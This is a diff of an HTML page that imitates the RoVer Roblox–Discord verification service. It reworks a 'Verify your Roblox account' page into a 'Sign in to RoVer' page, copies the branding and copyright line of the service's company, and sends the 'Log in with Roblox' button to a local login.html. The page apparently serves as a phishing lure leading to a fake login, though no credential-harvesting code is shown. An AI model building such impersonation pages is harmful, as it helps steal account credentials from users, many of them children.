@@ -3,16 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>RoVer – Verify Your Account</title>
+  <title>RoVer – Sign in</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     :root {
-      --accent: #c91673;
-      --accent-hover: #ad135f;
-      --text: #1a1a1a;
-      --gray: #666;
-      --bg: #fff;
-      --border: #e3e3e3;
+      --pink: #d22486;
+      --pink-hover: #b61c71;
+      --text-light: #ffffff;
+      --text-muted: #bbbbbb;
+      --bg-dark: #1d1d1d;
+      --bg-card: #111;
+      --footer-bg: #0f0f0f;
+      --border-color: #2a2a2a;
     }
 
     * {
@@ -21,24 +23,28 @@
 
     body {
       margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      -webkit-font-smoothing: antialiased;
+      font-family: "Inter", sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-light);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
     }
 
     /* Navbar */
     nav {
       width: 100%;
-      border-bottom: 1px solid var(--border);
-      background: var(--bg);
+      background-color: var(--pink);
+      padding: 14px 32px;
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 14px 32px;
-      position: sticky;
-      top: 0;
-      z-index: 100;
+    }
+
+    .nav-left, .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
     }
 
     .logo {
@@ -47,183 +53,177 @@
       gap: 10px;
       font-weight: 700;
       font-size: 20px;
-      color: var(--accent);
-      cursor: pointer;
+      color: var(--text-light);
+      text-decoration: none;
     }
 
     .logo img {
-      height: 34px;
+      height: 30px;
     }
 
-    .menu {
-      display: flex;
-      align-items: center;
-      gap: 24px;
-    }
-
-    .menu a {
-      color: var(--text);
+    nav a {
+      color: var(--text-light);
       text-decoration: none;
       font-weight: 500;
       font-size: 15px;
-      transition: color 0.2s ease;
+      opacity: 0.9;
+      transition: opacity 0.2s ease;
     }
 
-    .menu a:hover {
-      color: var(--accent);
+    nav a:hover {
+      opacity: 1;
     }
 
     .outline-btn {
-      border: 1px solid var(--accent);
+      border: 1px solid #fff;
       padding: 6px 14px;
       border-radius: 6px;
-      color: var(--accent);
+      color: #fff;
       font-weight: 500;
-      font-size: 14px;
       background: transparent;
       cursor: pointer;
+      font-size: 14px;
       transition: all 0.2s ease;
     }
 
     .outline-btn:hover {
-      background: var(--accent);
-      color: #fff;
+      background: rgba(255, 255, 255, 0.1);
     }
 
-    /* Header */
-    header {
-      text-align: center;
-      padding: 80px 20px 40px;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-
-    header h1 {
-      font-size: clamp(32px, 5vw, 48px);
-      font-weight: 700;
-      margin-bottom: 16px;
-    }
-
-    header p {
-      font-size: 18px;
-      color: var(--gray);
-      margin: 0 auto;
-      max-width: 600px;
-    }
-
-    /* Verification box */
-    .verify-box {
-      background: #fafafa;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 40px 30px;
-      max-width: 600px;
-      margin: 40px auto;
-      text-align: center;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.03);
-    }
-
-    .verify-box h2 {
-      font-size: 22px;
+    .sign-btn {
+      background: #fff;
+      color: #000;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 6px;
       font-weight: 600;
-      margin-bottom: 12px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background 0.2s ease;
     }
 
-    .verify-box p {
-      color: var(--gray);
+    .sign-btn:hover {
+      background: #ddd;
+    }
+
+    /* Main section */
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #1a1a1a;
+      padding: 60px 20px;
+    }
+
+    .login-card {
+      background: var(--bg-card);
+      padding: 50px 60px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .login-card h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    .login-card p {
+      color: var(--text-muted);
       font-size: 15px;
-      margin-bottom: 28px;
-      line-height: 1.6;
+      margin-bottom: 30px;
     }
 
-    .verify-btn {
-      background: var(--accent);
+    .login-btn {
+      background-color: var(--pink);
       color: #fff;
       border: none;
-      border-radius: 8px;
-      padding: 14px 28px;
-      font-size: 16px;
+      border-radius: 20px;
+      padding: 12px 28px;
+      font-size: 15px;
       font-weight: 600;
       cursor: pointer;
       transition: background 0.2s ease;
     }
 
-    .verify-btn:hover {
-      background: var(--accent-hover);
+    .login-btn:hover {
+      background-color: var(--pink-hover);
     }
 
     /* Footer */
     footer {
-      border-top: 1px solid var(--border);
-      text-align: center;
-      padding: 24px;
-      color: #888;
-      font-size: 14px;
-      margin-top: 80px;
-    }
-
-    footer a {
-      color: var(--accent);
-      text-decoration: none;
-    }
-
-    footer a:hover {
-      text-decoration: underline;
-    }
-
-    /* Mobile menu */
-    .hamburger {
-      display: none;
-      flex-direction: column;
-      gap: 5px;
-      cursor: pointer;
-    }
-
-    .hamburger span {
-      width: 22px;
-      height: 3px;
-      background: var(--text);
-      border-radius: 2px;
-      transition: all 0.3s ease;
-    }
-
-    .mobile-menu {
-      display: none;
-      flex-direction: column;
-      background: var(--bg);
-      border-top: 1px solid var(--border);
-      padding: 16px 32px;
-      animation: slideDown 0.25s ease;
-    }
-
-    .mobile-menu.show {
+      background: var(--footer-bg);
+      color: #ccc;
+      padding: 50px 40px 40px;
       display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 30px;
+      font-size: 14px;
     }
 
-    @keyframes slideDown {
-      from {
-        opacity: 0;
-        transform: translateY(-8px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+    .footer-left img {
+      height: 28px;
+      display: block;
+      margin-bottom: 10px;
     }
 
-    .mobile-menu a,
-    .mobile-menu button {
-      margin: 8px 0;
-      text-align: left;
-      font-size: 15px;
+    .footer-left p {
+      color: #999;
+      font-size: 13px;
+      margin: 6px 0;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 80px;
+    }
+
+    .footer-links div {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .footer-links a {
+      color: #bbb;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+
+    .footer-links a:hover {
+      color: #fff;
     }
 
     @media (max-width: 768px) {
-      .menu {
-        display: none;
+      nav {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
       }
-      .hamburger {
-        display: flex;
+
+      main {
+        padding: 40px 20px;
+      }
+
+      .login-card {
+        padding: 40px 20px;
+      }
+
+      footer {
+        flex-direction: column;
+        text-align: center;
+        align-items: center;
+      }
+
+      .footer-links {
+        gap: 40px;
+        justify-content: center;
       }
     }
   </style>
@@ -231,57 +231,50 @@
 <body>
   <!-- Navbar -->
   <nav>
-    <div class="logo">
-      <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
-      RoVer
-    </div>
-    <div class="menu">
+    <div class="nav-left">
+      <a href="#" class="logo">
+        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
+        RoVer
+      </a>
       <a href="#">Help</a>
       <a href="#">Team Members</a>
       <button class="outline-btn">RoVer Plus</button>
-      <button class="outline-btn">Manage Servers</button>
-      <a href="#">Verification</a>
     </div>
-    <div class="hamburger" id="hamburger">
-      <span></span>
-      <span></span>
-      <span></span>
+    <div class="nav-right">
+      <button class="outline-btn">Manage Servers</button>
+      <button class="sign-btn">Sign In</button>
     </div>
   </nav>
 
-  <div class="mobile-menu" id="mobileMenu">
-    <a href="#">Help</a>
-    <a href="#">Team Members</a>
-    <button class="outline-btn">RoVer Plus</button>
-    <button class="outline-btn">Manage Servers</button>
-    <a href="#">Verification</a>
-  </div>
+  <!-- Main Login Section -->
+  <main>
+    <div class="login-card">
+      <h1>Sign in to RoVer</h1>
+      <p>You must be 13 years of age or older to continue.</p>
+      <button class="login-btn" onclick="location.href='login.html'">Log in with Roblox</button>
+    </div>
+  </main>
 
-  <!-- Header -->
-  <header>
-    <h1>Verify your Roblox account</h1>
-    <p>RoVer makes it easy to connect your Roblox account to Discord and unlock verification features safely and automatically.</p>
-  </header>
-
-  <!-- Verification box -->
-  <section class="verify-box">
-    <h2>Start verification</h2>
-    <p>Click the button below to verify your account using RoVer’s trusted system.</p>
-    <button class="verify-btn" onclick="location.href='login.html'">✅ Verify with RoVer</button>
-  </section>
-
+  <!-- Footer -->
   <footer>
-    © 2025 RoVer. All rights reserved. · <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
+    <div class="footer-left">
+      <img src="https://i.imgur.com/n9mHnN9.png" alt="Imaginary Menagerie Logo" />
+      <p>© 2025 Imaginary Menagerie, LLC.</p>
+      <a href="#" style="color:#888;font-size:12px;">attributions</a>
+    </div>
+    <div class="footer-links">
+      <div>
+        <a href="#">Team members</a>
+        <a href="#">Support Discord server</a>
+        <a href="#">Add RoVer to your server</a>
+        <a href="#">Bot Developer API</a>
+      </div>
+      <div>
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Verify your Roblox account</a>
+      </div>
+    </div>
   </footer>
-
-  <script>
-    const hamburger = document.getElementById("hamburger");
-    const mobileMenu = document.getElementById("mobileMenu");
-
-    hamburger.addEventListener("click", () => {
-      hamburger.classList.toggle("active");
-      mobileMenu.classList.toggle("show");
-    });
-  </script>
 </body>
 </html>
